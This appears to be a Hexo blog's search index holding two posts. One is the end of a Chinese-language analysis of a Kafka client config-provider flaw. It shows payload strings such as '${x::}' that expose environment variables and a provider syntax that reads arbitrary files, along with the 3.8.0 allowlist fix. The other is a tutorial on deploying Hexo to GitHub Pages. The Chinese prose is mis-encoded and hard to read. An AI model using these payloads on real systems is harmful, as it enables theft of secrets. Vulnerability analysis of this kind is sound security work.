class="keyword">else</span> &#123;</span><br><span class="line">        Map&lt;String, String&gt; filteredData = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="built_in">this</span>.filteredEnvVarMap);</span><br><span class="line">        filteredData.keySet().retainAll(keys);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConfigData</span>(filteredData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Â·æ ¹æ®è¿™æ®µä»£ç é€»è¾‘å¯ä»¥çœ‹å‡ºï¼Œpathè¦ä¸ºç©ºä¸ç„¶ä¼šæŠ¥é”™é€€å‡ºï¼Œè€Œkeysä¸ä¸ºç©ºæ—¶åˆ™æ ¹æ®keysä»ç¯å¢ƒå˜é‡ä¸­æŸ¥æ‰¾å¯¹åº”çš„ç¯å¢ƒå˜é‡ï¼Œå¦‚æœkeysä¸ºç©ºåˆ™è¿”å›æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼Œäºæ˜¯å¯ä»¥æ„é€ payloadä¸º<code>$&#123;x::key_name&#125;</code>æˆ–è€…<code>$&#123;x::&#125;</code></p><p>é¡ºä¾¿æä¸€å˜´ï¼Œè¿™é‡Œ<code>EnvVarConfigProvider#configure</code>æ–¹æ³•å’Œ<code>FileConfigProvider#configure</code>å€’æ˜¯ä¸å¤ªä¸€æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> &#123;</span><br><span class="line">    Pattern envVarPattern;</span><br><span class="line">    <span class="keyword">if</span> (configs.containsKey(<span class="string">&quot;allowlist.pattern&quot;</span>)) &#123;</span><br><span class="line">        envVarPattern = Pattern.compile(String.valueOf(configs.get(<span class="string">&quot;allowlist.pattern&quot;</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        envVarPattern = Pattern.compile(<span class="string">&quot;.*&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;No pattern for environment variables provided. Using default pattern &#x27;(.*)&#x27;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.filteredEnvVarMap = (Map)<span class="built_in">this</span>.envVarMap.entrySet().stream().filter((envVar) -&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> envVarPattern.matcher((CharSequence)envVar.getKey()).matches();</span><br><span class="line">    &#125;).collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨æ¥é™åˆ¶å…è®¸è·å–çš„ç¯å¢ƒå˜é‡</p><p>ç»§ç»­åˆ†æ<code>org.apache.kafka.common.config.provider.DirectoryConfigProvider#get(java.lang.String, java.util.function.Predicate&lt;java.nio.file.Path&gt;)</code>å¯ä»¥å‘ç°è¿™ä¸ªæ„Ÿè§‰æ›´å‰å®³ï¼Œç»è¿‡è°ƒè¯•åŠ å°è¯•å¯ä»¥å‘ç°<code>$&#123;a:b:c&#125;</code>çš„æ ¼å¼è¢«è§£æä¸º<code>$&#123;providerName:path:filename&#125;</code>ï¼Œå¹¶ä¸”å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶å†…å®¹ï¼Œè€Œä¸æ˜¯å±€é™äºç±»ä¼¼propertiesæ–‡ä»¶çš„é”®å€¼å¯¹å†…å®¹</p><p><img src="https://s2.loli.net/2024/12/08/imRYpWTb3Orazxn.png"></p><p>è·Ÿè¸ªåˆ°<code>org.apache.kafka.common.config.provider.DirectoryConfigProvider#read</code>æ–¹æ³•å³å¯å‘ç°æ–‡ä»¶è¯»å–</p><p><img src="https://s2.loli.net/2024/12/08/FT5zK9IYUJCjkSm.png"></p><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><p>åœ¨3.8.0ç‰ˆæœ¬ä¸­åœ¨<code>configure</code>æ–¹æ³•å¤„åŠ äº†ç™½åå•é™åˆ¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> &#123;</span><br><span class="line">    allowedPaths = <span class="keyword">new</span> <span class="title class_">AllowedPaths</span>((String) configs.getOrDefault(ALLOWED_PATHS_CONFIG, <span class="literal">null</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å»ºè®®ä½¿ç”¨å—å½±å“åº”ç”¨ç¨‹åºçš„ç”¨æˆ·å°†kafkaå®¢æˆ·ç«¯å‡çº§åˆ°ç‰ˆæœ¬<code>&gt;=3.8.0</code>ï¼Œå¹¶è®¾ç½®JVMç³»ç»Ÿå± æ€§<code>org.apache.kafka.automatic.config providers=none</code>ã€‚  </p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>æ„Ÿè§‰ç›´æ¥æ¼æ´åˆ©ç”¨éš¾åº¦è¿˜æ˜¯å¾ˆè‹›åˆ»çš„ï¼Œå°±çœ‹æ€ä¹ˆæ³„éœ²å‡ºå­˜å…¥çš„é…ç½®ä¿¡æ¯äº†</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> kafka </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoåšå®¢éƒ¨ç½²åˆ°github</title>
      <link href="/2024/11/21/hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0github/"/>
      <url>/2024/11/21/hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0github/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><h2 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h2><p><a href="https://git-scm.com/">Git</a></p><h2 id="å®‰è£…nodejs"><a href="#å®‰è£…nodejs" class="headerlink" title="å®‰è£…nodejs"></a>å®‰è£…nodejs</h2><p>å¯ä»¥ç›´æ¥ä¸Š<a href="https://nodejs.org/zh-cn/download/prebuilt-installer">https://nodejs.org/zh-cn/download/prebuilt-installer</a></p><p>æœ‰å¤šç‰ˆæœ¬éœ€æ±‚çš„ä¹Ÿå¯ä»¥ç”¨nvmç®¡ç†å¤šä¸ªç‰ˆæœ¬çš„nodejs</p><p><a href="https://www.yuque.com/ph0ebus/security/rupe9swqdeftppqg">nvmç®¡ç†å¤šç‰ˆæœ¬nodejsç¯å¢ƒ</a></p><h2 id="å®‰è£…hexo"><a href="#å®‰è£…hexo" class="headerlink" title="å®‰è£…hexo"></a>å®‰è£…hexo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>å®‰è£…å¥½åæ‰§è¡Œ<code>hexo -version</code></p><p><img src="https://s2.loli.net/2024/11/21/aZ1CzvRIoMNQUBs.png"></p><h1 id="æœ¬åœ°éƒ¨ç½²"><a href="#æœ¬åœ°éƒ¨ç½²" class="headerlink" title="æœ¬åœ°éƒ¨ç½²"></a>æœ¬åœ°éƒ¨ç½²</h1><h2 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h2><p>æ‰¾ä¸€ä¸ªå–œæ¬¢çš„ç›®å½•ç”¨äºå­˜æ”¾åšå®¢</p><p><img src="https://s2.loli.net/2024/11/21/qHdmIwioMxsnE37.png"></p><p>ç„¶ååœ¨å½“å‰ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œhexoåˆå§‹åŒ–ä¸€ä¸ªé»˜è®¤æ¨¡æ¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init [blog_name]</span><br><span class="line">cd [blog_name]</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/21/2Z3NSGQHJOx8LCm.png"></p><h2 id="é¢„è§ˆ"><a href="#é¢„è§ˆ" class="headerlink" title="é¢„è§ˆ"></a>é¢„è§ˆ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean # æ¸…é™¤ç¼“å­˜æ–‡ä»¶ï¼Œå»ºè®®å†™å®Œæ–‡ç« åæ‰§è¡Œä¸€æ¬¡</span><br><span class="line">hexo g# ç”Ÿæˆ public æ–‡ä»¶å¤¹ï¼Œå†™å®Œæ–‡ç« æ‰§è¡Œ</span><br><span class="line">hexo s# å¯åŠ¨ hexo æœåŠ¡</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/21/bEJweLdkxivOto7.png"></p><p>ç„¶åè®¿é—®<a href="http://localhost:4000/%E5%8D%B3%E5%8F%AF">http://localhost:4000/å³å¯</a></p><p><img src="https://s2.loli.net/2024/11/21/SDQkAlrRm5wNK1J.png"></p><p>çœ‹åˆ°è¿™ä¸ªè¯´æ˜å°±éƒ¨ç½²æˆåŠŸäº†</p><h2 id="æ›´æ¢ä¸»é¢˜"><a href="#æ›´æ¢ä¸»é¢˜" class="headerlink" title="æ›´æ¢ä¸»é¢˜"></a>æ›´æ¢ä¸»é¢˜</h2><p><a href="https://hexo.io/themes/">Themes</a></p><p>è¿™æ˜¯å®˜ç½‘çš„ä¸»é¢˜é“¾æ¥ï¼Œç›®å‰æœ‰400+çš„ä¸»é¢˜ï¼Œé€‰æ‹©ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ä¸»é¢˜</p><p>ä»¥ <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack">https://github.com/Ares-X/hexo-theme-freemind.bithack</a> è¿™ä¸ªä¸»é¢˜ä¸ºä¾‹</p><p><img src="https://s2.loli.net/2024/11/21/EcbUZPK8nqGhuwj.png"></p><p>åœ¨ Readme æ–‡æ¡£ä¸­å¾€å¾€å†™æœ‰å¦‚ä½•ä½¿ç”¨çš„æ•™ç¨‹</p><p>ä¸»è¦æ˜¯å‡ ä¸ªæ­¥éª¤</p><p>å°†ä¸»é¢˜ä¸‹è½½åˆ°themesç›®å½•</p><p><img src="https://s2.loli.net/2024/11/21/KuoQB9fhieLUPjG.png"></p><p>å®‰è£…ç¯å¢ƒè¿è¡Œçš„é¢å¤–ä¾èµ–åŒ…</p><p><img src="https://s2.loli.net/2024/11/21/Z3SPfEYb9oJNMer.png"></p><p>ç„¶åä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¯ç”¨è¯¥ä¸»é¢˜</p><p>å¤åˆ¶ä¸»é¢˜çš„<code>_config.yml</code>åˆ°åšå®¢æ ¹ç›®å½•ä¸‹ï¼Œæ”¹åä¸º<code>_config.[theme_name].yml</code></p><p><img src="https://s2.loli.net/2024/11/21/URfyNk4uWJHMPE9.png"></p><p><img src="https://s2.loli.net/2024/11/21/ABb9nHRNZWymr8s.png"></p><p>ç„¶åç»™hexoæ ¹ç›®å½•ä¸‹çš„<code>_config.yml</code>æ–‡ä»¶ä¸­ theme é€‰é¡¹æ”¹ä¸ºè¦æ¢æˆçš„ä¸»é¢˜</p><p><img src="https://s2.loli.net/2024/11/21/FRdXAvCfIun9rTy.png"></p><p>ç„¶åæ ¹æ®ä¸»é¢˜ä¿®æ”¹é…ç½®æ–‡ä»¶<code>_config.[theme_name].yml</code>çš„å†…å®¹è¿›è¡Œä¸ªæ€§åŒ–é…ç½®</p><p><a href="https://hexo.io/docs/configuration.html">https://hexo.io/docs/configuration.html</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¹ç…§çœ‹ç€ä¸€ä¸‹æ”¹å°±å¥½:</span></span><br><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: http://zespia.tw/hexo/docs/configure.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/tommy351/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site </span></span><br><span class="line"><span class="attr">title:</span> <span class="string">My</span> <span class="string">Blog</span> <span class="comment">#åšå®¢å</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">to</span> <span class="string">be</span> <span class="string">continued...</span> <span class="comment">#å‰¯æ ‡é¢˜</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">My</span> <span class="string">blog</span> <span class="comment">#ç»™æœç´¢å¼•æ“çœ‹çš„ï¼Œå¯¹ç½‘ç«™çš„æè¿°ï¼Œå¯ä»¥è‡ªå®šä¹‰</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Yourname</span> <span class="comment">#ä½œè€…ï¼Œåœ¨åšå®¢åº•éƒ¨å¯ä»¥çœ‹åˆ°</span></span><br><span class="line"><span class="attr">email:</span> <span class="string">yourname@yourmail.com</span> <span class="comment">#ä½ çš„è”ç³»é‚®ç®±</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span> <span class="comment">#ä¸­æ–‡ã€‚å¦‚æœä¸å¡«åˆ™é»˜è®¤è‹±æ–‡</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL #è¿™é¡¹æš‚ä¸é…ç½®ï¼Œç»‘å®šåŸŸååï¼Œæ¬²åˆ›å»ºsitemap.xmléœ€è¦é…ç½®è¯¥é¡¹</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://yoursite.com</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing æ–‡ç« å¸ƒå±€ã€å†™ä½œæ ¼å¼çš„å®šä¹‰ï¼Œä¸ä¿®æ”¹</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">auto_spacing:</span> <span class="literal">false</span> <span class="comment"># Add spaces between asian characters and western characters</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">max_open_file:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">backtick_code_block:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Archives é»˜è®¤å€¼ä¸º2ï¼Œè¿™é‡Œéƒ½ä¿®æ”¹ä¸º1ï¼Œç›¸åº”é¡µé¢å°±åªä¼šåˆ—å‡ºæ ‡é¢˜ï¼Œè€Œéå…¨æ–‡</span></span><br><span class="line"><span class="comment">## 2: Enable pagination</span></span><br><span class="line"><span class="comment">## 1: Disable pagination</span></span><br><span class="line"><span class="comment">## 0: Fully Disable</span></span><br><span class="line"><span class="attr">archive:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">category:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">tag:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Server ä¸ä¿®æ”¹</span></span><br><span class="line"><span class="comment">## Hexo uses Connect as a server</span></span><br><span class="line"><span class="comment">## You can customize the logger format as defined in</span></span><br><span class="line"><span class="comment">## http://www.senchalabs.org/connect/logger.html</span></span><br><span class="line"><span class="attr">port:</span> <span class="number">4000</span></span><br><span class="line"><span class="attr">logger:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">logger_format:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format æ—¥æœŸæ ¼å¼ï¼Œå¯ä»¥ä¿®æ”¹æˆè‡ªå·±å–œæ¬¢çš„æ ¼å¼</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-M-D</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">H:mm:ss</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination æ¯é¡µæ˜¾ç¤ºæ–‡ç« æ•°ï¼Œå¯ä»¥è‡ªå®šä¹‰ï¼Œè´´ä¸»è®¾ç½®çš„æ˜¯10</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disqus Disqusæ’ä»¶ï¼Œæˆ‘ä»¬ä¼šæ›¿æ¢æˆâ€œå¤šè¯´â€ï¼Œä¸ä¿®æ”¹</span></span><br><span class="line"><span class="attr">disqus_shortname:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions è¿™é‡Œé…ç½®ç«™ç‚¹æ‰€ç”¨ä¸»é¢˜å’Œæ’ä»¶ï¼Œæš‚æ—¶é»˜è®¤</span></span><br><span class="line"><span class="comment">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span></span><br><span class="line"><span class="comment">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span></span><br><span class="line"><span class="attr">exclude_generator:</span></span><br><span class="line"><span class="attr">plugins:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo-generator-feed</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo-generator-sitemap</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment ç«™ç‚¹éƒ¨ç½²åˆ°githubè¦é…ç½®(é‡ç‚¹ï¼ï¼ï¼)</span></span><br><span class="line"><span class="comment">## Docs: http://zespia.tw/hexo/docs/deploy.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">//è¿™é‡Œæ˜¯éœ€è¦å¡«çš„ï¼Œä¸‹é¢ä¼šè®²</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>æŒ‰éœ€ä¿®æ”¹å®Œåä¸€å¥—å°è¿æ‹›å³å¯é‡æ–°éƒ¨ç½²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean # æ¸…é™¤ç¼“å­˜æ–‡ä»¶ï¼Œå»ºè®®å†™å®Œæ–‡ç« åæ‰§è¡Œä¸€æ¬¡</span><br><span class="line">hexo g# ç”Ÿæˆ public æ–‡ä»¶å¤¹ï¼Œå†™å®Œæ–‡ç« æ‰§è¡Œ</span><br><span class="line">hexo s# å¯åŠ¨ hexo æœåŠ¡</span><br></pre></td></tr></table></figure><h1 id="éƒ¨ç½²åˆ°githubæ‰˜ç®¡"><a href="#éƒ¨ç½²åˆ°githubæ‰˜ç®¡" class="headerlink" title="éƒ¨ç½²åˆ°githubæ‰˜ç®¡"></a>éƒ¨ç½²åˆ°githubæ‰˜ç®¡</h1><p>æ²¡æœ‰githubè´¦å·çš„å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·</p><p>è®¾ç½®gitçš„å…¨å±€å˜é‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;user_name&quot; # user_nameå¡«å…¥GitHubç”¨æˆ·å</span><br><span class="line">git config --global user.email &quot;user_email&quot; # user_emailå¡«å…¥GitHubæ³¨å†Œçš„é‚®ç®±</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/21/xI1bSfFK8qw3zG7.png"></p><p>æ–°å»ºä¸€ä¸ª Repositoryï¼ŒRepository nameä¸€å®šè¦æ˜¯<code>ä½ çš„ç”¨æˆ·å.github.io</code>ï¼Œè®°å¾—è®¾ä¸º<code>public</code>ï¼Œå…¬å¼€å¯è§</p><p><img src="https://s2.loli.net/2024/11/21/gIcN7pMoRE3iQJv.png"></p><p><img src="https://s2.loli.net/2024/11/21/FCERKnY5LNVDlJ1.png"></p><p>ç„¶ååœ¨githubé…ç½®ssh-key</p><p>è®¿é—®<code>C:\Users\ä½ çš„ç”¨æˆ·å\.ssh</code>ç›®å½•ï¼Œå¦‚æœå­˜åœ¨ id_rsa.pub æ–‡ä»¶åˆ™å¤åˆ¶å…¶æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ç”Ÿæˆä¸€ä¸ª</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;user.email&quot; # user.emailä¸ºGitHubä¸Šæ³¨å†Œçš„é‚®ç®±</span><br></pre></td></tr></table></figure><p><font style="color:rgb(64, 62, 62);">ç„¶åç›´æ¥ä¸‰ä¸ªå›è½¦å³å¯ï¼Œé»˜è®¤ä¸éœ€è¦è®¾ç½®å¯†ç ï¼Œæ²¡å¤ªå¤§å¿…è¦</font></p><p><font style="color:rgb(64, 62, 62);">å¤åˆ¶å†…å®¹åï¼Œè¿™å°±æ˜¯ä½ çš„å…¬é’¥ï¼Œè®¿é—® </font><a href="https://github.com/settings/keys">https://github.com/settings/keys</a> <font style="color:rgb(64, 62, 62);">æ·»åŠ åˆ°github</font></p><p><img src="https://s2.loli.net/2024/11/21/tXZe5hTvDa8PWx4.png"></p><p><img src="https://s2.loli.net/2024/11/21/GT1NPKFtzcfjRdy.png"></p><p><font style="color:rgb(64, 62, 62);">ç„¶åæˆ‘ä»¬åœ¨Git Bashä¸­éªŒè¯æ˜¯å¦è¿æ¥æˆåŠŸ</font></p><p><img src="https://s2.loli.net/2024/11/21/xz7MpQR5bKPocS8.png"></p><p>ä¿®æ”¹<code>_config.yml</code>çš„é…ç½®é¡¹</p><p><img src="https://s2.loli.net/2024/11/21/HFVWPQaKnNOv9pj.png"></p><p>ç„¶åå°±å¯ä»¥å‡†å¤‡å¼€å§‹éƒ¨ç½²äº†ï¼Œåœ¨gitä¹‹å‰éœ€è¦ä¸‹è½½æ’ä»¶ï¼Œéœ€è¦åœ¨åˆšåˆšçš„åšå®¢ç›®å½•ä¸‹å®‰è£…å“¦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>ç„¶åä¸€å¥—å°è¿æ‹›éƒ¨ç½²åˆ°github</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">hexo d     // éƒ¨ç½²</span><br></pre></td></tr></table></figure><h1 id="é…ç½®ä¸ªäººåŸŸå"><a href="#é…ç½®ä¸ªäººåŸŸå" class="headerlink" title="é…ç½®ä¸ªäººåŸŸå"></a>é…ç½®ä¸ªäººåŸŸå</h1><p>åœ¨ä¹°åŸŸåçš„æœåŠ¡å•†å¤„é…ç½®CNAMEè®°å½•</p><p><img src="https://s2.loli.net/2024/11/21/ltRNZrvSbmqXnsa.png"></p><p>åœ¨ä»“åº“ä¸­æ‰¾åˆ°è®¾ç½®</p><p><img src="https://s2.loli.net/2024/11/21/w5qFCD7zhjePlK9.png"></p><p>å†™ä¸Šéœ€è¦è§£æçš„åŸŸå</p><p><img src="https://s2.loli.net/2024/11/21/IofvMUmgHwGBRqK.png"></p><p>ç„¶åå°±å¯ä»¥äº†</p><h1 id="æŠ¥é”™è§£å†³"><a href="#æŠ¥é”™è§£å†³" class="headerlink" title="æŠ¥é”™è§£å†³"></a>æŠ¥é”™è§£å†³</h1><h3 id="fatal-not-a-git-repository-or-any-of-the-parent-directories-git"><a href="#fatal-not-a-git-repository-or-any-of-the-parent-directories-git" class="headerlink" title="fatal: not a git repository (or any of the parent directories): .git"></a>fatal: not a git repository (or any of the parent directories): .git</h3><p>è™½ç„¶ä¸çŸ¥é“ä¸ºå•¥æŠ¥é”™ï¼Œä½†æ˜¯<font style="color:rgb(85, 85, 85);">å°†hexoæ ¹ç›®å½•ä¸‹çš„.deploy_git&#x2F;åˆ é™¤æ‰ï¼Œé‡æ–°éƒ¨ç½²å³å¯</font></p><p><img src="https://s2.loli.net/2024/11/21/PZSkOJhzq52XWs6.png"></p><p><img src="https://s2.loli.net/2024/11/21/8n2CZPsW7jdD4Om.png"></p>]]></content>
      
      
      <categories>
          
          <category> environment </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> environment </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
